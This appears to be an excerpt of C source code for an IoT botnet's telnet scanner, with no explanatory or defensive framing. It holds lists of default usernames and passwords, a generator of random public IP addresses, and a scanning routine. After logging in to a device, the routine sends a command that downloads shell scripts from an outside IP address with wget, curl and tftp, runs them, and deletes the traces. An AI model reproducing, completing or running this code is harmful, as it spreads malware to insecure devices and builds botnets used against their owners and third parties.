...
char *usernames[] = {"root\0", "admin\0", "guest\0", "telnet\0", "pi\0", "cisco\0", "netgear\0", "oracle\0", "support\0","cusadmin\0"};
char *passwords[] = {"root\0", "guest\0", "1234\0", "telnet\0", "raspberry\0", "\0", "cisco\0", "netgear\0", "oracle\0", "support\0", "password\0", "alpine\0","maxided\0"};
...
in_addr_t getRandomPublicIP()
{
	...
	if(randnum == 2)
	{
		szprintf(ip, "180.180.%d.%d", ipState[3], ipState[4]);
	}
	if(randnum == 3)
	{
	...
	if(randnum == 4)
	{
		szprintf(ip, "119.91.%d.%d", ipState[3], ipState[4]);
	}
	if(randnum == 5)
	{
		szprintf(ip, "113.53.%d.%d", ipState[3], ipState[4]);
	}
	if(randnum == 6)
	{
		szprintf(ip, "125.25.%d.%d", ipState[3], ipState[4]);
	}
	if(randnum == 7)
	{
		szprintf(ip, "125.26.%d.%d", ipState[3], ipState[4]);
	}
...
/*
+-++-+-  ++++-++-+  +-++-++-++++++++-+--+  -  +-+-  
 S +S S  SSS+S  S   +-+S  +-SSSSSSS+S +-+  S  +S S  
 - +-+--+++++-+ -   +-++-+- -+++++++-+-+-  --++-+--+
*/

void TelnetScan(char *ip)
{
        ...
        while(1)
        {
                        ...
                        case 1:
                                {
                                        ...
                                        if(fds[i].totalTimeout + 8 < time(NULL)) //was if(fds[i].totalTimeout + 5 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
			...
			case 9:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://148.163.83.71/gtop.sh || curl -O http://148.163.83.71/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 148.163.83.71 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 148.163.83.71; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n", 358, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 10;
				}
			case 10:
				{
					if(send(fds[i].fd, "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'\r\n", 55, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 11;
				}
			case 11:
				{
                    ...
                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                    {
                    	fds[i].totalTimeout = 0;
                    	fds[i].bufUsed = 0;
                    	send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://148.163.83.71/gtop.sh || curl -O http://148.163.83.71/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 148.163.83.71 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 148.163.83.71; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n", 358, MSG_NOSIGNAL);
	...
	int x;
        ...
        if(!strcmp(argv[0], "SCANNER"))
        {
                ...
                {		
						...
						for(i = 0;i<threads;i++){
							pthread_create(&thread, NULL, &TelnetScan, (void *) NULL);
						}
